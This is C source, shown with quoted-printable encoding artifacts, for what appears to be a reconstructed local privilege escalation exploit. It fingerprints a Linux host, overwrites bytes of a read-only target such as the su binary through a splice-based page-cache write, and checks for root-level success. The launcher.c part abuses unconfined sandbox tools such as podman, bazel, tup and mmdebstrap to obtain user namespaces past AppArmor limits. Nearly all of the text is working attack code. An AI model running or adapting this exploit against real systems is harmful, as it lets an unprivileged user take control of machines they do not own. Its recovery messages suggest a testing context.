    target_offset =3D (off_t)selected->target_offset;
    if (splice(TARGET_FD, &target_offset, pipefd[1], NULL, TARGET_BYTES, =
0) !=3D TARGET_BYTES ||
        splice(VECTOR_FD, &vector_offset, pipefd[1], NULL, VECTOR_BYTES, =
0) !=3D VECTOR_BYTES ||
        splice(pipefd[0], NULL, sender, NULL, TOTAL_BYTES, 0) !=3D TOTAL_=
BYTES)
        return 1;
    close(pipefd[0]); close(pipefd[1]); close(sender);
    waitpid(child, &status, 0);
    usleep(500000);
    if (pread(TARGET_FD, after, sizeof(after), (off_t)selected->target_of=
fset - 16) !=3D sizeof(after))
        return 2;
    if (memcmp(before + 16, selected->original_slice, 8) =3D=3D 0 &&
        memcmp(before, after, 16) =3D=3D 0 && memcmp(before + 24, after +=
 24, 16) =3D=3D 0 &&
        memcmp(after + 16, selected->desired_slice, 8) =3D=3D 0 &&
        memcmp(after + 16, before + 16, 8) !=3D 0) {
        puts("TRIGGER changed=3D1 guards_ok=3D1 target_exact=3D1 caps=3Dz=
ero no_new_privs=3D1");
        return 0;
    }
    return 2;
}

static int netns_stage(void)
{
    char *nfq_argv[] =3D { "nf_queue", "-q", "0", "-t", "8", NULL };
    pid_t helper;
    int rc, status;

    if (inherited_profile() < 0 || nft_helper_main() !=3D 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/route_localnet") < 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/accept_local") < 0 || netwo=
rk_setup() < 0)
        return 2;
    fflush(NULL);
    helper =3D fork();
    if (helper < 0)
        return 2;
    if (helper =3D=3D 0)
        _Exit(nfq_helper_main(5, nfq_argv));
    sleep(1);
    rc =3D mutate_stage();
    kill(helper, SIGTERM);
    waitpid(helper, &status, 0);
    return rc;
}

static bool target_build_id_once(const struct profile *profile)
{
    unsigned char build_id[20], *data;
    size_t length, hits =3D 0, i;
    int fd =3D open(profile->target_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0 || read_all_fd(fd, &data, &length) < 0) {
        if (fd >=3D 0) close(fd);
        return false;
    }
    close(fd);
    for (i =3D 0; i < sizeof(build_id); i++) {
        unsigned int value;
        if (sscanf(profile->target_build_id + i * 2, "%2x", &value) !=3D =
1) {
            free(data);
            return false;
        }
        build_id[i] =3D (unsigned char)value;
    }
    for (i =3D 0; i + sizeof(build_id) <=3D length; i++)
        if (memcmp(data + i, build_id, sizeof(build_id)) =3D=3D 0)
            hits++;
    free(data);
    return hits =3D=3D 1;
}

static bool pam_rule_once(void)
{
    char line[1024], a[64], b[64], c[256], extra[64];
    int matches =3D 0;
    FILE *stream =3D fopen("/etc/pam.d/su", "r");
    if (!stream)
        stream =3D fopen("/usr/lib/pam.d/su", "r");
    if (!stream)
        return false;
    while (fgets(line, sizeof(line), stream))
        if (sscanf(line, "%63s %63s %255s %63s", a, b, c, extra) =3D=3D 3=
 &&
            !strcmp(a, "auth") && !strcmp(b, "sufficient") && !strcmp(c, =
"pam_rootok.so"))
            matches++;
    fclose(stream);
    return matches =3D=3D 1;
}

static bool lsm_matches(const char *constraint)
{
    char out[64], err[128], mode[64], *context;
    if (!strcmp(constraint, "none"))
        return true;
    if (!strncmp(constraint, "apparmor:", 9))
        return file_contains("/proc/self/attr/current", constraint + 9);
    if (!strncmp(constraint, "selinux:", 8)) {
        char *getenforce[] =3D { "/usr/sbin/getenforce", NULL };
        snprintf(mode, sizeof(mode), "%s", constraint + 8);
        context =3D strchr(mode, ':');
        if (context)
            *context++ =3D 0;
        if (capture(getenforce, out, sizeof(out), err, sizeof(err), 5) !=
=3D 0 ||
            strncmp(out, mode, strlen(mode)) !=3D 0)
            return false;
        return !context || file_contains("/proc/self/attr/current", conte=
xt);
    }
    return false;
}

static bool profile_identity_matches(const struct profile *profile)
{
    if (!profile->flexible_identity)
        return getuid() =3D=3D profile->expected_uid && geteuid() =3D=3D =
profile->expected_uid &&
               getgid() =3D=3D profile->expected_gid && getegid() =3D=3D =
profile->expected_gid &&
               (!profile->check_supplementary_groups ||
                supplementary_groups_allowed(profile->expected_gid,
                                             profile->allowed_supplementa=
ry_groups));
    {
        uid_t ruid, euid, suid;
        gid_t rgid, egid, sgid;
        if (getresuid(&ruid, &euid, &suid) < 0 || getresgid(&rgid, &egid,=
 &sgid) < 0 ||
            (uint32_t)(ruid - 1000) >=3D 0xfc16U ||
            (uint32_t)(rgid - 1000) >=3D 0xfc16U ||
            ruid !=3D euid || ruid !=3D suid || rgid !=3D egid || rgid !=
=3D sgid ||
            (uid_t)setfsuid((uid_t)-1) !=3D ruid ||
            (gid_t)setfsgid((gid_t)-1) !=3D rgid ||
            !supplementary_groups_allowed(rgid, profile->allowed_suppleme=
ntary_groups) ||
            !public_caps_before_valid || public_caps_before.inheritable |=
|
            public_caps_before.permitted || public_caps_before.effective =
|| public_caps_before.ambient)
            return false;
        return true;
    }
}

static unsigned long filesystem_magic(const char *name)
{
    if (!strcmp(name, "ext4")) return EXT4_SUPER_MAGIC;
    if (!strcmp(name, "xfs")) return XFS_SUPER_MAGIC;
    if (!strcmp(name, "btrfs")) return BTRFS_SUPER_MAGIC;
    return 0;
}

static bool profile_matches(const struct profile *profile, bool allow_mut=
ated,
                            char hash[65])
{
    struct utsname un;
    struct stat st;
    struct statfs fs;
    char out[256], err[256];
    char *dpkg[] =3D { "/usr/bin/dpkg-query", "-W", "-f=3D${Version}",
                     (char *)profile->package_name, NULL };
    char *rpm[] =3D { "/usr/bin/rpm", "-q", "--qf", "%{EVR}",
                    (char *)profile->package_name, NULL };
    char **query =3D !strcmp(profile->package_query, "dpkg") ? dpkg : rpm=
;
    int writable;

    if (!zero_caps() || !profile_identity_matches(profile) || uname(&un) =
< 0 ||
        strcmp(un.machine, "x86_64") || !csv_has(profile->kernel_releases=
, un.release) ||
        !os_release_equals("ID", profile->distribution_id) ||
        !os_release_equals("VERSION_ID", profile->distribution_version) |=
|
        statfs(profile->target_path, &fs) < 0 ||
        (unsigned long)fs.f_type !=3D filesystem_magic(profile->filesyste=
m) ||
        capture(query, out, sizeof(out), err, sizeof(err), 5) !=3D 0 ||
        !csv_has(profile->package_versions, out) || stat(profile->target_=
path, &st) < 0 ||
        st.st_uid !=3D profile->target_uid || st.st_gid !=3D profile->tar=
get_gid ||
        (st.st_mode & 07777) !=3D profile->target_mode ||
        (uint64_t)st.st_size !=3D profile->target_size ||
        !file_contains("/proc/self/status", "NoNewPrivs:\t0") ||
        !file_contains("/proc/self/status", "Seccomp:\t0") || !lsm_matche=
s(profile->lsm_constraint))
        return false;
    errno =3D 0;
    writable =3D open(profile->target_path, O_WRONLY | O_CLOEXEC);
    if (writable >=3D 0) {
        close(writable);
        return false;
    }
    if (errno !=3D EACCES || hash_path(profile->target_path, hash) < 0 ||
        (strcmp(hash, profile->baseline_sha256) !=3D 0 &&
         (!allow_mutated || strcmp(hash, profile->mutated_sha256) !=3D 0)=
) ||
        !target_build_id_once(profile) || !pam_rule_once() ||
        !executable("/usr/bin/unshare", "/bin/unshare") ||
        !executable("/usr/sbin/ip", "/sbin/ip") || !executable("/usr/bin/=
su", "/bin/su"))
        return false;
    return true;
}

static int identify(const struct profile **profile, char hash[65])
{
    const struct profile *match =3D NULL;
    size_t matches =3D 0;
    for (size_t i =3D 0; i < compiled_profile_count; i++) {
        char candidate_hash[65];
        if (profile_matches(&compiled_profiles[i], false, candidate_hash)=
) {
            match =3D &compiled_profiles[i];
            snprintf(hash, 65, "%s", candidate_hash);
            matches++;
        }
    }
    if (matches =3D=3D 1) {
        *profile =3D match;
        return 1;
    }
    return matches ? 2 : 0;
}

static int authorized_stage(bool probe)
{
    char hash[65], self[64];
    const struct launcher_backend *backend;
    const char *name;
    pid_t child;
    int status;

    if (inherited_profile() < 0)
        return 2;
    if (!strcmp(selected->execution_mode, "ubuntu_optional_launcher")) {
        name =3D getenv("SKB_POC_LAUNCHER");
        backend =3D launcher_find(name);
        if (!name || !backend || !csv_has(selected->allowed_launchers, na=
me) ||
            !file_contains("/proc/self/attr/current", backend->lsm_constr=
aint))
            return 2;
    }
    if (hash_path(selected->target_path, hash) < 0 || strcmp(hash, select=
ed->baseline_sha256))
        return 2;
    if (strcmp(selected->execution_mode, "ubuntu_optional_launcher"))
        return probe ? 2 : netns_stage();
    if (!executable("/usr/bin/unshare", "/bin/unshare") ||
        snprintf(self, sizeof(self), "/proc/self/fd/%d", SELF_FD) >=3D (i=
nt)sizeof(self))
        return 2;
    child =3D fork();
    if (child < 0)
        return 2;
    if (child =3D=3D 0) {
        const char *unshare =3D executable("/usr/bin/unshare", "/bin/unsh=
are");
        execl(unshare, "unshare", "--user", "--map-root-user", "--net", s=
elf,
              probe ? "--internal-netns-probe" : "--internal-netns-transi=
tion", NULL);
        _Exit(127);
    }
    if (waitpid(child, &status, 0) < 0)
        return 2;
    if (WIFEXITED(status) && WEXITSTATUS(status) =3D=3D 0 && probe)
        puts("LAUNCHER_PROBE result=3DPASS control_plane=3DPASS trigger_a=
ttempted=3D0");
    return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(statu=
s);
}

static bool metadata_equal(const struct stat *a, const struct stat *b)
{
    return a->st_dev =3D=3D b->st_dev && a->st_ino =3D=3D b->st_ino && a-=
>st_uid =3D=3D b->st_uid &&
        a->st_gid =3D=3D b->st_gid && a->st_mode =3D=3D b->st_mode && a->=
st_size =3D=3D b->st_size &&
        a->st_mtim.tv_sec =3D=3D b->st_mtim.tv_sec && a->st_mtim.tv_nsec =
=3D=3D b->st_mtim.tv_nsec &&
        a->st_ctim.tv_sec =3D=3D b->st_ctim.tv_sec && a->st_ctim.tv_nsec =
=3D=3D b->st_ctim.tv_nsec;
}

static int hash_backing_page(const struct profile *profile, char hex[65])
{
    unsigned char *page =3D NULL, digest[SHA256_DIGEST_LENGTH];
    off_t offset =3D (off_t)profile->target_offset & ~(off_t)4095;
    int fd =3D open(profile->target_path, O_RDONLY | O_DIRECT | O_CLOEXEC=
);
    ssize_t n;
    if (fd < 0 || posix_memalign((void **)&page, 4096, 4096) !=3D 0) {
        if (fd >=3D 0) close(fd);
        return -1;
    }
    n =3D pread(fd, page, 4096, offset);
    close(fd);
    if (n !=3D 4096) {
        free(page);
        return -1;
    }
    SHA256(page, 4096, digest);
    free(page);
    for (size_t i =3D 0; i < sizeof(digest); i++)
        sprintf(hex + i * 2, "%02x", digest[i]);
    hex[64] =3D 0;
    return 0;
}

static int run_direct_transition(void)
{
    char self[64];
    pid_t child;
    int status;
    const char *unshare =3D executable("/usr/bin/unshare", "/bin/unshare"=
);
    if (!unshare || snprintf(self, sizeof(self), "/proc/self/fd/%d", SELF=
_FD) >=3D (int)sizeof(self))
        return 127;
    child =3D fork();
    if (child =3D=3D 0) {
        execl(unshare, "unshare", "--user", "--map-root-user", "--net",
              self, "--internal-transition", NULL);
        _Exit(127);
    }
    if (child < 0 || waitpid(child, &status, 0) < 0)
        return 125;
    return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(statu=
s);
}

static int forward_main(void)
{
    const struct profile *profile;
    struct stat before, after;
    char current_hash[65], page_hash[65], self[4096], out[1024], err[1024=
];
    uint8_t window[40];
    int rc;

    if (identify(&profile, current_hash) !=3D 1) {
        printf("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RESUL=
T=3DENVIRONMENT_MISMATCH\n");
        return 2;
    }
    selected =3D profile;
    printf("PROFILE_ID=3D%s\n", profile->profile_id);
    if (launcher_request &&
        (!csv_has(profile->allowed_launchers, launcher_request) ||
         strcmp(profile->execution_mode, "ubuntu_optional_launcher")))
        goto precondition_fail;
    if (!profile->enabled) {
        puts("PROFILE_STATUS=3DRECOVERY_VALIDATION_BLOCKED");
        goto precondition_fail;
    }
    rc =3D consumer(profile, out, err);
    if (rc =3D=3D 0 || !strcmp(out, "0\n") || stat(profile->target_path, =
&before) < 0 ||
        install_fds(profile) < 0)
        goto precondition_fail;
    selected_launcher =3D NULL;
    if (!strcmp(profile->execution_mode, "ubuntu_optional_launcher")) {
        const char *candidates =3D launcher_request ? launcher_request : =
profile->automatic_launchers;
        char list[512], *save =3D NULL, *name;
        if (self_path(self) < 0)
            goto precondition_fail;
        snprintf(list, sizeof(list), "%s", candidates);
        for (name =3D strtok_r(list, ",", &save); name; name =3D strtok_r=
(NULL, ",", &save)) {
            const struct launcher_backend *backend =3D launcher_find(name=
);
            if (backend && launcher_installed(backend) &&
                launcher_run(backend, self, "--internal-probe", profile->=
distribution_suite) =3D=3D 0) {
                selected_launcher =3D backend;
                break;
            }
        }
        if (!selected_launcher)
            goto precondition_fail;
    }
    printf("TRIGGER_ATTEMPTED=3D1\nRECOVERY_REQUIRED=3D1\nRECOVERY_STATE=
=3DPENDING\n"
           "REBOOT_REQUIRED=3D1\n");
    if (!strcmp(profile->recovery_mode, "snapshot_rollback")) {
        puts("RECOVERY_METHOD=3DVM_SNAPSHOT_ROLLBACK\n"
             "RECOVERY_COMMAND=3DROLL_BACK_VM_SNAPSHOT");
    } else if (selected_launcher) {
        printf("RECOVERY_ARTIFACT=3D%s\nRECOVERY_SHA256=3D%s\n",
               profile->recovery_artifact, profile->recovery_sha256);
        printf("SELECTED_LAUNCHER=3D%s\nRECOVERY_COMMAND=3D./%s --launche=
r %s\n",
               selected_launcher->name, profile->recovery_artifact, selec=
ted_launcher->name);
    } else {
        printf("RECOVERY_ARTIFACT=3D%s\nRECOVERY_SHA256=3D%s\n",
               profile->recovery_artifact, profile->recovery_sha256);
        printf("RECOVERY_COMMAND=3D./%s\n", profile->recovery_artifact);
    }
    if (selected_launcher) {
        if (self_path(self) < 0)
            goto trigger_fail;
        rc =3D launcher_run(selected_launcher, self, "--internal-transiti=
on",
                          profile->distribution_suite);
    } else {
        rc =3D run_direct_transition();
    }
    if (rc !=3D 0 || hash_path(profile->target_path, current_hash) < 0 ||
        strcmp(current_hash, profile->mutated_sha256) ||
        hash_backing_page(profile, page_hash) < 0 || strcmp(page_hash, pr=
ofile->backing_page_sha256) ||
        pread(TARGET_FD, window, sizeof(window), (off_t)profile->target_o=
ffset - 16) !=3D sizeof(window) ||
        memcmp(window, profile->guard_before, 16) ||
        memcmp(window + 16, profile->desired_slice, 8) ||
        memcmp(window + 24, profile->guard_after, 16) ||
        stat(profile->target_path, &after) < 0 || !metadata_equal(&before=
, &after) ||
        consumer(profile, out, err) !=3D 0 || strcmp(out, "0\n") || err[0=
])
        goto trigger_fail;
    printf("LPE_RESULT=3DPASS\nFINAL_RESULT_SCOPE=3DLPE_ONLY\nFINAL_RESUL=
T=3DPASS\nSUCCESS_MESSAGE=3D%s\n",
           profile->success_message);
    return 0;
trigger_fail:
    puts("LPE_RESULT=3DFAIL\nFINAL_RESULT_SCOPE=3DLPE_ONLY\nFINAL_RESULT=
=3DFAIL");
    return 1;
precondition_fail:
    puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RESULT=3DFA=
IL");
    return 3;
}

static int launcher_probe_main(const char *requested)
{
    const struct profile *profile;
    char hash[65], self[4096], list[512], *save =3D NULL, *name;
    int installed =3D 0, passed =3D 0, failed =3D 0;

    if (identify(&profile, hash) !=3D 1 ||
        strcmp(profile->execution_mode, "ubuntu_optional_launcher")) {
        puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RESULT=
=3DENVIRONMENT_MISMATCH");
        return 2;
    }
    selected =3D profile;
    printf("PROFILE_ID=3D%s\n", profile->profile_id);
    if (install_fds(profile) < 0 || self_path(self) < 0)
        goto fail;
    snprintf(list, sizeof(list), "%s", requested ? requested : profile->a=
llowed_launchers);
    for (name =3D strtok_r(list, ",", &save); name; name =3D strtok_r(NUL=
L, ",", &save)) {
        const struct launcher_backend *backend =3D launcher_find(name);
        int status =3D 127;
        int is_installed =3D backend && csv_has(profile->allowed_launcher=
s, backend->name) &&
                           launcher_installed(backend);
        if (is_installed) {
            installed++;
            status =3D launcher_run(backend, self, "--internal-probe", pr=
ofile->distribution_suite);
            if (status =3D=3D 0) passed++; else failed++;
        }
        printf("LAUNCHER_CANDIDATE name=3D%s installed=3D%d probe_status=
=3D%d viable=3D%d trigger_attempted=3D0\n",
               name, is_installed, status, is_installed && status =3D=3D =
0);
    }
    printf("LAUNCHER_SCAN_RESULT installed=3D%d passed=3D%d failed=3D%d t=
rigger_attempted=3D0\n",
           installed, passed, failed);
    if ((requested && passed =3D=3D 1) || (!requested && installed > 0 &&=
 failed =3D=3D 0)) {
        puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RESULT=
=3DPASS");
        return 0;
    }
fail:
    puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RESULT=3DFA=
IL");
    return 3;
}

static int netns_probe(void)
{
    if (inherited_profile() < 0 || nft_helper_main() !=3D 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/route_localnet") < 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/accept_local") < 0 || netwo=
rk_setup() < 0)
        return 2;
    puts("LAUNCHER_CONTROL_PLANE result=3DPASS private_userns=3D1 private=
_netns=3D1 trigger_attempted=3D0");
    return 0;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IOLBF, 0);
    if (argc =3D=3D 2) {
        if (!strcmp(argv[1], "--internal-netns-transition")) return netns=
_stage();
        if (!strcmp(argv[1], "--internal-netns-probe")) return netns_prob=
e();
        if (!strcmp(argv[1], "--internal-transition")) return authorized_=
stage(false);
        if (!strcmp(argv[1], "--internal-probe")) return authorized_stage=
(true);
        if (!strcmp(argv[1], "--list-profiles")) {
            for (size_t i =3D 0; i < compiled_profile_count; i++)
                printf("PROFILE_ID=3D%s EVIDENCE_ALIASES=3D%s RECOVERY_AR=
TIFACT=3D%s ENABLED=3D%d\n",
                       compiled_profiles[i].profile_id, compiled_profiles=
[i].evidence_aliases,
                       compiled_profiles[i].recovery_artifact, compiled_p=
rofiles[i].enabled);
            return 0;
        }
        if (!strcmp(argv[1], "--identify")) {
            const struct profile *profile;
            char hash[65];
            if (normalize_public_capabilities() =3D=3D 0 && identify(&pro=
file, hash) =3D=3D 1) {
                printf("PROFILE_ID=3D%s\nTRIGGER_ATTEMPTED=3D0\nRECOVERY_=
REQUIRED=3D0\n",
                       profile->profile_id);
                return profile->enabled ? 0 : 3;
            }
            puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RES=
ULT=3DENVIRONMENT_MISMATCH");
            return 2;
        }
        if (!strcmp(argv[1], "--scan-launchers")) {
            if (normalize_public_capabilities() =3D=3D 0)
                return launcher_probe_main(NULL);
            puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RES=
ULT=3DENVIRONMENT_MISMATCH");
            return 2;
        }
    } else if (argc =3D=3D 3) {
        if (!strcmp(argv[1], "--probe-launcher")) {
            if (normalize_public_capabilities() =3D=3D 0)
                return launcher_probe_main(argv[2]);
            puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RES=
ULT=3DENVIRONMENT_MISMATCH");
            return 2;
        }
        if (!strcmp(argv[1], "--launcher")) {
            launcher_request =3D argv[2];
            if (normalize_public_capabilities() =3D=3D 0)
                return forward_main();
            puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RES=
ULT=3DENVIRONMENT_MISMATCH");
            return 2;
        }
    } else if (argc =3D=3D 1) {
        if (normalize_public_capabilities() =3D=3D 0)
            return forward_main();
        puts("TRIGGER_ATTEMPTED=3D0\nRECOVERY_REQUIRED=3D0\nFINAL_RESULT=
=3DENVIRONMENT_MISMATCH");
        return 2;
    }
    fputs("invalid usage\n", stderr);
    return 64;
}

~~~

### launcher.c

~~~c
// SPDX-License-Identifier: GPL-2.0
/* Behavior-faithful reconstruction of launcher.c, ELF 0x406b00..0x4094cf=
. */
#define _GNU_SOURCE
#define _XOPEN_SOURCE 700
#include <errno.h>
#include <fcntl.h>
#include <ftw.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "launcher.h"

#define LAUNCHER_ERROR 125
#define LAUNCHER_NOT_FOUND 127

const struct launcher_backend launcher_backends[LAUNCHER_COUNT] =3D {
    { "podman",         "/usr/bin/podman",         "podman (unconfined)",=
          0, 1 },
    { "buildah",        "/usr/bin/buildah",        "buildah (unconfined)"=
,         1, 1 },
    { "rootlesskit",    "/usr/bin/rootlesskit",    "rootlesskit (unconfin=
ed)",     2, 1 },
    { "opam",           "/usr/bin/opam",           "opam (unconfined)",  =
          3, 1 },
    { "tup",            "/usr/bin/tup",            "tup (unconfined)",   =
          4, 1 },
    { "ch-run",         "/usr/bin/ch-run",         "ch-run (unconfined)",=
          5, 1 },
    { "mmdebstrap",     "/usr/bin/mmdebstrap",     "mmdebstrap (unconfine=
d)",      6, 1 },
    { "lxc-usernsexec", "/usr/bin/lxc-usernsexec", "lxc-usernsexec (uncon=
fined)",  7, 1 },
    { "vdens",          "/usr/bin/vdens",          "vdens (unconfined)", =
          8, 1 },
    { "vpnns",          "/usr/bin/vpnns",          "vpnns (unconfined)", =
          9, 1 },
    { "userbindmount",  "/usr/bin/userbindmount",  "userbindmount (unconf=
ined)",  10, 1 },
    { "rpm",            "/usr/bin/rpm",            "rpm (unconfined)",   =
         11, 1 },
    { "bazel",          "/usr/bin/bazel",          "linux-sandbox (unconf=
ined)",  12, 1 },
    { "uwsgi-core",     "/usr/bin/uwsgi-core",     "uwsgi-core (unconfine=
d)",     13, 1 },
    { "libcamerify",    "/usr/bin/libcamerify",    "libcamerify (unconfin=
ed)",    14, 1 },
    { "runc",           "/usr/sbin/runc",          "runc (unconfined)",  =
         15, 0 },
    { "crun",           "/usr/bin/crun",           "crun (unconfined)",  =
         16, 0 },
    { "sbuild",         "/usr/bin/sbuild",         "sbuild",             =
         17, 0 },
};

static int copy_executable(const char *source, const char *destination)
{
    char buf[65536];
    int in =3D -1, out =3D -1, rc =3D -1;

    in =3D open(source, O_RDONLY | O_CLOEXEC);
    out =3D open(destination, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0=
500);
    if (in < 0 || out < 0)
        goto done;
    for (;;) {
        ssize_t n =3D read(in, buf, sizeof(buf));
        size_t off =3D 0;

        if (n < 0)
            goto done;
        if (n =3D=3D 0)
            break;
        while (off < (size_t)n) {
            ssize_t written =3D write(out, buf + off, (size_t)n - off);
            if (written <=3D 0)
                goto done;
            off +=3D (size_t)written;
        }
    }
    if (fsync(out) =3D=3D 0 && fchmod(out, 0555) =3D=3D 0)
        rc =3D 0;
done:
    if (in >=3D 0)
        close(in);
    if (out >=3D 0)
        close(out);
    return rc;
}

static int write_file(const char *path, const char *text, mode_t mode)
{
    size_t length =3D strlen(text), off =3D 0;
    int fd =3D open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode)=
;

    if (fd < 0)
        return -1;
    while (off < length) {
        ssize_t n =3D write(fd, text + off, length - off);
        if (n <=3D 0) {
            close(fd);
            return -1;
        }
        off +=3D (size_t)n;
    }
    return close(fd);
}

static int remove_entry(const char *path, const struct stat *st, int type=
,
                        struct FTW *ftw)
{
    (void)st;
    (void)type;
    (void)ftw;
    return remove(path);
}

static void cleanup_tree(const char *name, const char *path)
{
    if (path[0] && access(path, F_OK) =3D=3D 0 &&
        nftw(path, remove_entry, 32, FTW_DEPTH | FTW_PHYS) < 0)
        fprintf(stderr, "LAUNCHER_CLEANUP_FAIL name=3D%s path=3D%s errno=
=3D%d\n",
                name, path, errno);
}

static int read_status_file(const char *path)
{
    char buf[32] =3D {0}, *end;
    long value;
    int fd =3D open(path, O_RDONLY | O_CLOEXEC);
    ssize_t n;

    if (fd < 0)
        return LAUNCHER_ERROR;
    n =3D read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <=3D 0)
        return LAUNCHER_ERROR;
    errno =3D 0;
    value =3D strtol(buf, &end, 10);
    return errno =3D=3D 0 && end !=3D buf && value >=3D 0 && value < 256
        ? (int)value : LAUNCHER_ERROR;
}

static int spawn(char *const argv[], const char *directory,
                 const struct launcher_backend *backend)
{
    int status;
    pid_t pid;

    fflush(NULL);
    pid =3D fork();
    if (pid =3D=3D 0) {
        if (directory && chdir(directory) < 0) {
            perror("launcher chdir");
            _Exit(LAUNCHER_ERROR);
        }
        if (backend && setenv("SKB_POC_LAUNCHER", backend->name, 1) < 0)
            _Exit(LAUNCHER_ERROR);
        execv(argv[0], argv);
        perror("launcher exec");
        _Exit(errno =3D=3D ENOENT ? LAUNCHER_NOT_FOUND : 126);
    }
    if (pid < 0 || waitpid(pid, &status, 0) < 0)
        return LAUNCHER_ERROR;
    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    if (WIFSIGNALED(status))
        return 128 + WTERMSIG(status);
    return LAUNCHER_ERROR;
}

static int make_poc(const char *directory, const char *self, char path[PA=
TH_MAX])
{
    int n =3D snprintf(path, PATH_MAX, "%s/poc", directory);
    return n > 0 && n < PATH_MAX ? copy_executable(self, path) : -1;
}

static int run_tup(const struct launcher_backend *backend, const char *se=
lf,
                   const char *stage)
{
    char dir[] =3D "/tmp/skb-poc-tup.XXXXXX", poc[PATH_MAX], tupfile[PATH=
_MAX];
    char rule[1024];
    char *init_argv[] =3D { (char *)backend->executable, "init", NULL };
    char *run_argv[] =3D { (char *)backend->executable, NULL };
    int rc =3D LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(tupfile, sizeof(tupfile), "%s/Tupfile", dir) >=3D (int)s=
izeof(tupfile) ||
        snprintf(rule, sizeof(rule),
                 ": |> SKB_POC_LAUNCHER=3Dtup ./poc %s && /usr/bin/touch =
%%o |> done\n",
                 stage) >=3D (int)sizeof(rule) || write_file(tupfile, rul=
e, 0444) < 0)
        goto out;
    if (spawn(init_argv, dir, NULL) =3D=3D 0)
        rc =3D spawn(run_argv, dir, backend);
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_bazel(const struct launcher_backend *backend, const char *=
self,
                     const char *stage)
{
    char dir[] =3D "/tmp/skb-poc-bazel.XXXXXX";
    char poc[PATH_MAX], workspace[PATH_MAX], build[PATH_MAX], output[PATH=
_MAX];
    char rule[2048];
    int rc =3D LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(workspace, sizeof(workspace), "%s/WORKSPACE", dir) >=3D =
(int)sizeof(workspace) ||
        snprintf(build, sizeof(build), "%s/BUILD", dir) >=3D (int)sizeof(=
build) ||
        snprintf(output, sizeof(output), "%s/output", dir) >=3D (int)size=
of(output) ||
        write_file(workspace, "", 0444) < 0 ||
        snprintf(rule, sizeof(rule),
                 "genrule(name=3D\"probe\", srcs=3D[\"poc\"], outs=3D[\"d=
one\"], "
                 "cmd=3D\"SKB_POC_LAUNCHER=3Dbazel $(location poc) %s && =
/usr/bin/touch $@\")\n",
                 stage) >=3D (int)sizeof(rule) || write_file(build, rule,=
 0444) < 0)
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--batch", "--noh=
ome_rc",
                         "--output_base", output, "build",
                         "--spawn_strategy=3Dsandboxed", "--strategy=3DGe=
nrule=3Dsandboxed",
                         "//:probe", NULL };
        rc =3D spawn(argv, dir, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int mkdir_join(const char *root, const char *name)
{
    char path[PATH_MAX];
    return snprintf(path, sizeof(path), "%s/%s", root, name) < (int)sizeo=
f(path)
        ? mkdir(path, 0755) : -1;
}

static int link_join(const char *root, const char *name, const char *targ=
et)
{
    char path[PATH_MAX];
    return snprintf(path, sizeof(path), "%s/%s", root, name) < (int)sizeo=
f(path)
        ? symlink(target, path) : -1;
}

static int run_charliecloud(const struct launcher_backend *backend,
                            const char *self, const char *stage)
{
    static const char *dirs[] =3D { "proc", "sys", "dev", "tmp", "home", =
"etc", "usr", "run" };
    static const struct { const char *name, *target; } links[] =3D {
        { "bin", "usr/bin" }, { "lib", "usr/lib" }, { "lib64", "usr/lib64=
" },
    };
    char dir[] =3D "/tmp/skb-poc-ch-run.XXXXXX", root[PATH_MAX], poc[PATH=
_MAX];
    size_t i;
    int rc =3D LAUNCHER_ERROR;

    if (!mkdtemp(dir) || snprintf(root, sizeof(root), "%s/root", dir) >=
=3D (int)sizeof(root) ||
        mkdir(root, 0755) < 0)
        goto out;
    for (i =3D 0; i < sizeof(dirs) / sizeof(dirs[0]); i++)
        if (mkdir_join(root, dirs[i]) < 0)
            goto out;
    for (i =3D 0; i < sizeof(links) / sizeof(links[0]); i++)
        if (link_join(root, links[i].name, links[i].target) < 0)
            goto out;
    if (make_poc(root, self, poc) < 0)
        goto out;
    {
        char *argv[] =3D { (char *)backend->executable, "--no-passwd", "-=
-bind=3D/usr:/usr",
                         root, "--", "/poc", (char *)stage, NULL };
        rc =3D spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_mmdebstrap(const struct launcher_backend *backend,
                          const char *self, const char *stage, const char=
 *suite)
{
    char dir[] =3D "/tmp/skb-poc-mmdebstrap.XXXXXX", poc[PATH_MAX], tar[P=
ATH_MAX];
    char hook[4352];
    int rc =3D LAUNCHER_ERROR;

    if (!suite || !mkdtemp(dir) || chmod(dir, 0755) < 0 ||
        make_poc(dir, self, poc) < 0 ||
        snprintf(tar, sizeof(tar), "%s/root.tar", dir) >=3D (int)sizeof(t=
ar) ||
